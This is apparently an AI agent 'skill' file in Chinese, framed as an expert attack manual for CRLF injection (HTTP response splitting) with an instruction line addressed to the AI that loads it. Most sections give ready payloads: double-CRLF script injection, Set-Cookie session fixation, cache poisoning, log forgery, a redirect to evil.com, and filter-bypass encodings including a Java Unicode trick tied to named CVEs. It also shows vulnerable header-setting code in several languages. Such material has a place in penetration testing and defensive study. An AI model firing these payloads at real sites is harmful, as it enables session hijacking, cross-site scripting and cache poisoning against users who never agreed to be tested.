# 技能：CRLF注入——专家攻击手册

> **AI加载指令**：CRLF注入（HTTP响应分割）技术。涵盖头部注入、通过双CRLF进行响应体注入、XSS提升、缓存中毒和编码绕过。扫描器常忽略此技术，但可链式触发XSS、会话固定和缓存攻击。

## 0. 相关路由

- [ghost-bits-cast-attack](../ghost-bits-cast-attack/SKILL.md) 当目标是**Java服务**且`%0D%0A` / `\r\n`编码被WAF阻断时——用`瘍`（U+760D，低字节`\r`）和`瘊`（U+760A，低字节`\n`）替代可透过Angus Mail / Jakarta Mail SMTP、Apache HttpClient头部、JDK HttpServer响应和ActiveJ HTTP注入真实CRLF（重新启用Jira CVE-2025-57733和JDK CVE-2026-21933类）

## 1. 核心概念

CRLF = `\r\n`（回车换行，`%0D%0A`）。HTTP头部由CRLF分隔。若用户输入未经净化直接反射到响应头部，注入CRLF字符可创建新头部甚至响应体。

```
正常：Location: /page?url=USER_INPUT
攻击：Location: /page?url=%0D%0ASet-Cookie:admin=true
结果：两个头部——Location + 注入的Set-Cookie
```

---

## 2. 检测

### 基础探测

```text
%0D%0ANew-Header:injected

# 在URL参数中：
https://目标.com/redirect?url=%0D%0AX-Injected:true

# 检查响应头部是否包含"X-Injected: true"
```

### 双CRLF——响应体注入

两个连续的CRLF序列结束头部并开始响应体：

```text
%0D%0A%0D%0A<script>alert(1)</script>

# 结果：
HTTP/1.1 302 Found
Location: /page

<script>alert(1)</script>
```

---

## 3. 利用场景

### 通过Set-Cookie实现会话固定

```text
%0D%0ASet-Cookie:PHPSESSID=攻击者控制的会话ID
```

### 通过响应体实现XSS

```text
%0D%0A%0D%0A<html><script>alert(document.cookie)</script></html>
```

### 缓存中毒

若响应被CDN或代理缓存，注入的头部/体将服务所有用户：

```text
GET /page?q=%0D%0AContent-Length:0%0D%0A%0D%0AHTTP/1.1%20200%20OK%0D%0AContent-Type:text/html%0D%0A%0D%0A<script>alert(1)</script>
```

### 日志注入

CRLF出现在可见日志字段（User-Agent、Referer）可伪造日志条目：

```text
User-Agent: normal%0D%0A127.0.0.1 - admin [日期] "GET /admin" 200
```

---

## 4. 过滤绕过

| 过滤器 | 绕过方法 |
|---|---|
| 阻断`%0D%0A` | 尝试单独`%0D`、单独`%0A`或Unicode`%E5%98%8A%E5%98%8D` |
| 单次URL解码 | 双重编码：`%250D%250A` |
| 字面移除`\r\n` | 使用URL编码形式 |
| 仅值中阻断 | 在参数名中注入 |

```text
# Unicode/UTF-8绕过：
%E5%98%8A%E5%98%8D  → 在某些解析器中解码为CRLF

# 双重URL编码：
%250D%250A → 服务器解码为%0D%0A → 解析为CRLF

# 部分注入（仅LF）：
%0A → 某些服务器接受LF而不带CR
```

---

## 5. 真实世界利用链

### CRLF + 会话固定

```text
# 通过重定向参数注入Set-Cookie：
?url=%0D%0ASet-Cookie:PHPSESSID=攻击者控制的会话ID

# 结果：
HTTP/1.1 302 Found
Location: /page
Set-Cookie: PHPSESSID=攻击者控制的会话ID

# 受害者使用攻击者会话 → 登录后攻击者劫持
```

### CRLF → 通过双CRLF响应体注入实现XSS

```text
# 两个CRLF序列结束头部并注入响应体：
?url=%0D%0A%0D%0A<script>alert(document.cookie)</script>

# 结果：
HTTP/1.1 302 Found
Location: /page

<script>alert(document.cookie)</script>
```

### CRLF在302 Location中 → 重定向劫持

```text
# 在原始Location前注入新Location头部：
?url=%0D%0ALocation:evil.com%0D%0A%0D%0A

# 某些服务器使用最后一个Location头部 → 重定向到evil.com
```

---

## 6. 常见漏洞模式

```php
// PHP — 带用户输入的header()（PHP < 5.1.2易受攻击）：
header("Location: " . $_GET['url']);

// Python — 未净化输入的重定向：
return redirect(request.args.get('next'))

// Node.js — 带用户输入的setHeader：
res.setHeader('X-Custom', userInput);

// Java — 带用户输入的response.setHeader：
response.setHeader("Location", request.getParameter("url"));
```

---

## 7. 测试清单

```
□ 在重定向URL参数中注入%0D%0A
□ 在Set-Cookie名称/值路径中注入%0D%0A
□ 尝试双CRLF进行响应体注入→XSS
□ 测试编码绕过：双重编码、Unicode (%E5%98%8D%E5%98%8A)、仅LF (%0A)
□ 检查响应是否可缓存→缓存中毒
□ 在User-Agent / Referer中测试日志注入
□ 测试CRLF + Set-Cookie实现会话固定
□ 验证Location头部是否可注入到302响应中
```
